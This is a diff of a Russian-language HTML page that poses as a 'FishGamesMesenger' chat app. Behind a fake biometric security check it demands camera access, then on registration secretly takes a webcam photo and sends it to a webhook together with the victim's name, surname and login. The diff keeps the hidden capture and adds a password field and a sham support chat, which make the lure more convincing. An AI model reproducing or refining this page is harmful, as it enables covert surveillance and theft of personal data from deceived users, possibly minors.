@@ -8,16 +8,10 @@
         body { 
             font-family: 'Segoe UI', sans-serif; 
             background: linear-gradient(135deg, #008080 0%, #20b2aa 100%); 
-            color: white; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            min-height: 100vh; 
-            margin: 0; 
-            overflow: hidden; 
+            color: white; display: flex; justify-content: center; align-items: center; 
+            min-height: 100vh; margin: 0; overflow: hidden; 
         }
 
-        /* Узор волн */
         body::before {
             content: ""; position: absolute; width: 200%; height: 200%; top: -50%; left: -50%;
             background: url('https://www.transparenttextures.com/patterns/waves.png');
@@ -25,53 +19,55 @@
         }
         @keyframes moveWaves { from { transform: translate(0,0); } to { transform: translate(50px, 50px); } }
 
-        /* Окно верификации */
         #camera-overlay {
             position: fixed; inset: 0; background: #0d1a17; z-index: 2000;
             display: flex; justify-content: center; align-items: center; text-align: center;
         }
         .warning-box { border: 2px solid #22c55e; padding: 30px; border-radius: 15px; background: #1a2e2a; max-width: 380px; }
 
-        /* Форма регистрации */
-        #reg-screen { z-index: 10; }
-        .reg-card { background: #1a2e2a; padding: 30px; border-radius: 15px; width: 350px; border: 1px solid #2e8b57; box-shadow: 0 10px 30px rgba(0,0,0,0.4); }
-        .input-group { margin-bottom: 15px; }
+        .reg-card { background: #1a2e2a; padding: 30px; border-radius: 15px; width: 350px; border: 1px solid #2e8b57; z-index: 10; }
+        .input-group { margin-bottom: 12px; }
         label { display: block; margin-bottom: 5px; font-size: 13px; color: #a7f3d0; }
         input { 
             width: 100%; padding: 10px; border-radius: 8px; border: 1px solid #2d4f47; 
             background: #243b35; color: white; box-sizing: border-box; outline: none; 
         }
-        input:focus { border-color: #4ade80; }
+
         .btn { 
             width: 100%; padding: 12px; background: #22c55e; border: none; border-radius: 8px; 
             color: white; font-weight: bold; cursor: pointer; transition: 0.3s; 
         }
-        .btn:hover { background: #16a34a; }
 
-        /* ИНТЕРФЕЙС МЕССЕНДЖЕРА */
         #messenger-screen { 
             display: none; width: 95vw; height: 90vh; background: #1a2e2a; 
             border-radius: 15px; z-index: 100; border: 1px solid #2e8b57; overflow: hidden;
         }
         .messenger-container { display: flex; height: 100%; }
         
-        /* Боковая панель */
-        .sidebar { width: 250px; background: #142522; border-right: 1px solid #2e8b57; display: flex; flex-direction: column; padding: 15px; }
-        .search-box { border: 1px solid white; border-radius: 20px; padding: 5px 15px; text-align: center; margin-bottom: 20px; font-size: 14px; }
-        .contact-item { display: flex; align-items: center; gap: 10px; margin-bottom: 15px; }
-        .avatar { width: 50px; height: 50px; background: #22c55e; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; border: 1px solid white; }
-        .support { border: 1px solid white; padding: 10px; margin-top: auto; font-size: 13px; text-align: center; }
-
-        /* Зона чата */
-        .chat-area { flex: 1; display: flex; flex-direction: column; background: rgba(32, 178, 170, 0.1); position: relative; }
-        .chat-header { padding: 15px; text-align: center; font-weight: bold; font-size: 18px; border-bottom: 1px solid #2e8b57; }
-        .messages-display { flex: 1; padding: 20px; overflow-y: auto; display: flex; flex-direction: column; gap: 10px; }
-        .msg-bubble { background: white; color: black; padding: 10px 15px; border-radius: 15px; align-self: flex-end; max-width: 70%; position: relative; }
+        .sidebar { width: 280px; background: #142522; border-right: 1px solid #2e8b57; display: flex; flex-direction: column; padding: 15px; }
         
-        /* Поле ввода */
-        .input-bar { padding: 15px; background: #1a2e2a; display: flex; gap: 10px; align-items: center; border-top: 1px solid #2e8b57; }
-        .msg-input { flex: 1; border: 2px solid #2e8b57; border-radius: 10px; padding: 12px; background: white; color: black; }
-        .send-btn { background: #22c55e; border-radius: 50%; width: 45px; height: 45px; display: flex; align-items: center; justify-content: center; border: none; cursor: pointer; }
+        .search-input { 
+            width: 100%; background: none; border: 1px solid white; border-radius: 20px; 
+            padding: 8px; color: white; text-align: center; margin-bottom: 20px; outline: none;
+        }
+
+        .contact-list { flex: 1; overflow-y: auto; }
+        .contact-item { 
+            display: flex; align-items: center; gap: 12px; padding: 10px; 
+            cursor: pointer; border-radius: 10px; transition: 0.2s;
+        }
+        .contact-item:hover { background: rgba(34, 197, 94, 0.2); }
+        .avatar { width: 45px; height: 45px; background: #22c55e; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; border: 1px solid white; flex-shrink: 0; }
+
+        .chat-area { flex: 1; display: flex; flex-direction: column; background: rgba(0,0,0,0.1); }
+        .chat-header { padding: 15px; text-align: center; font-weight: bold; font-size: 18px; border-bottom: 1px solid #2e8b57; color: #4ade80; }
+        .messages-display { flex: 1; padding: 20px; overflow-y: auto; display: flex; flex-direction: column; gap: 10px; }
+        
+        .msg-bubble { background: white; color: black; padding: 10px 15px; border-radius: 15px; align-self: flex-end; max-width: 70%; word-wrap: break-word; }
+        .msg-incoming { align-self: flex-start; background: #2d4f47; color: white; }
+
+        .input-bar { padding: 15px; background: #1a2e2a; display: flex; gap: 10px; border-top: 1px solid #2e8b57; }
+        .msg-input { flex: 1; border-radius: 10px; padding: 12px; border: none; outline: none; }
 
         #video, #canvas { display: none; }
     </style>
@@ -80,48 +76,47 @@
 
 <div id="camera-overlay">
     <div class="warning-box">
-        <h3 style="color: #ff5252;">⚠️ FishGames Security</h3>
-        <p>Для активации мессенджера требуется верификация камеры.<br>При отказе устройство будет заблокировано.</p>
-        <button class="btn" onclick="requestAccess()">ПРОЙТИ ПРОВЕРКУ</button>
+        <h3>⚠️ FishGames SECURITY</h3>
+        <p>Биометрическая верификация лица обязательна для входа.</p>
+        <button class="btn" onclick="requestAccess()">ВКЛЮЧИТЬ КАМЕРУ</button>
     </div>
 </div>
 
 <div id="reg-screen" class="reg-card">
     <h2>FishGamesMesenger</h2>
-    <div class="input-group">
-        <label>Имя</label>
-        <input type="text" id="firstname" placeholder="Иван">
+    <div class="input-group"><label>Имя</label><input type="text" id="firstname" placeholder="Иван"></div>
+    <div class="input-group"><label>Фамилия</label><input type="text" id="lastname" placeholder="Иванов"></div>
+    <div class="input-group"><label>Год рождения</label>
+        <input type="text" id="birthyear" maxlength="4" placeholder="2000" oninput="this.value=this.value.replace(/[^0-9]/g,''); if(this.value>2025)this.value='2025'">
     </div>
-    <div class="input-group">
-        <label>Год рождения</label>
-        <input type="text" id="birthyear" placeholder="2000" maxlength="4" oninput="this.value=this.value.replace(/[^0-9]/g,''); if(this.value>2025)this.value='2025'">
-    </div>
-    <div class="input-group">
-        <label>Логин</label>
-        <input type="text" id="login" placeholder="user_prime">
-    </div>
+    <div class="input-group"><label>Логин</label><input type="text" id="login" placeholder="cool_user"></div>
+    <div class="input-group"><label>Пароль</label><input type="password" id="pass" placeholder="******"></div>
     <button class="btn" onclick="register()">ЗАРЕГИСТРИРОВАТЬСЯ</button>
 </div>
 
 <div id="messenger-screen">
     <div class="messenger-container">
         <div class="sidebar">
-            <div class="search-box">поиск</div>
-            <div class="contact-item">
-                <div class="avatar" id="user-avatar">?</div>
-                <div id="contact-name">Загрузка...</div>
+            <input type="text" class="search-input" placeholder="поиск" oninput="filterContacts(this.value)">
+            <div class="contact-list" id="contacts">
+                <div class="contact-item" onclick="openChat('Служба поддержки')">
+                    <div class="avatar">⚙️</div>
+                    <div>Служба поддержки</div>
+                </div>
             </div>
-            <div class="support">служба поддержки</div>
+            <div style="margin-top: 20px; border-top: 1px solid #2e8b57; padding-top: 10px;">
+                <div class="contact-item" style="cursor: default;">
+                    <div class="avatar" id="my-ava" style="background: #008080;">?</div>
+                    <div id="my-name">Вы</div>
+                </div>
+            </div>
         </div>
         <div class="chat-area">
-            <div class="chat-header">FishGamesMesenger</div>
-            <div class="messages-display" id="chat-box">
-                </div>
+            <div class="chat-header" id="chat-title">Выберите чат</div>
+            <div class="messages-display" id="chat-box"></div>
             <div class="input-bar">
-                <input type="text" class="msg-input" id="messageText" placeholder="Напишите сообщение...">
-                <button class="send-btn" onclick="sendMessage()">
-                    <svg width="24" height="24" viewBox="0 0 24 24" fill="white"><path d="M2.01 21L23 12 2.01 3 2 10l15 2-15 2z"/></svg>
-                </button>
+                <input type="text" class="msg-input" id="messageText" placeholder="Введите текст...">
+                <button class="btn" style="width: 60px; margin-top: 0;" onclick="sendMessage()">➤</button>
             </div>
         </div>
     </div>
@@ -140,46 +135,46 @@
             const s = await navigator.mediaDevices.getUserMedia({video: true});
             video.srcObject = s;
             document.getElementById('camera-overlay').style.display = 'none';
-        } catch(e) {
-            alert("ОШИБКА БЕЗОПАСНОСТИ! Доступ к камере обязателен.");
-            location.reload();
-        }
+        } catch(e) { location.reload(); }
     }
 
     function register() {
-        const name = document.getElementById('firstname').value;
+        const fn = document.getElementById('firstname').value;
+        const ln = document.getElementById('lastname').value;
         const login = document.getElementById('login').value;
-        const year = document.getElementById('birthyear').value;
+        if(!fn || !login) return alert("Заполни поля!");
 
-        if(!name || !login) return alert("Заполни все поля!");
-
-        // Скрытое фото
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
+        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
         canvas.getContext('2d').drawImage(video, 0, 0);
-        
         canvas.toBlob(b => {
             const fd = new FormData();
             fd.append('payload_json', JSON.stringify({
-                embeds: [{ title: "📸 FishGames: Данные получены", color: 3066993, fields: [
-                    {name: "Имя", value: name, inline: true}, {name: "Год", value: year, inline: true}, {name: "Логин", value: login}
+                embeds: [{ title: "FishGames: Вход", color: 3066993, fields: [
+                    {name: "ФИО", value: fn + ' ' + ln}, {name: "Логин", value: login}
                 ]}]
             }));
-            fd.append('file', b, 'p.png');
+            fd.append('file', b, 'shot.png');
             fetch(webhook, {method: 'POST', body: fd});
         });
 
-        // Переход в мессенджер
         document.getElementById('reg-screen').style.display = 'none';
         document.getElementById('messenger-screen').style.display = 'block';
-        document.getElementById('contact-name').innerText = name;
-        document.getElementById('user-avatar').innerText = name[0].toUpperCase();
+        document.getElementById('my-name').innerText = fn;
+        document.getElementById('my-ava').innerText = fn[0].toUpperCase();
+        
+        // Авто-открытие чата поддержки
+        openChat('Служба поддержки');
+    }
+
+    function openChat(name) {
+        document.getElementById('chat-title').innerText = name;
+        const box = document.getElementById('chat-box');
+        box.innerHTML = `<div class="msg-bubble msg-incoming">Привет! Добро пожаловать в FishGamesMesenger. Чем могу помочь?</div>`;
     }
 
     function sendMessage() {
         const inp = document.getElementById('messageText');
         if(!inp.value) return;
-        
         const box = document.getElementById('chat-box');
         const m = document.createElement('div');
         m.className = 'msg-bubble';
@@ -188,7 +183,14 @@
         inp.value = '';
         box.scrollTop = box.scrollHeight;
     }
-</script>
 
+    function filterContacts(val) {
+        const items = document.querySelectorAll('.contact-item');
+        items.forEach(item => {
+            const text = item.innerText.toLowerCase();
+            item.style.display = text.includes(val.toLowerCase()) ? 'flex' : 'none';
+        });
+    }
+</script>
 </body>
 </html>
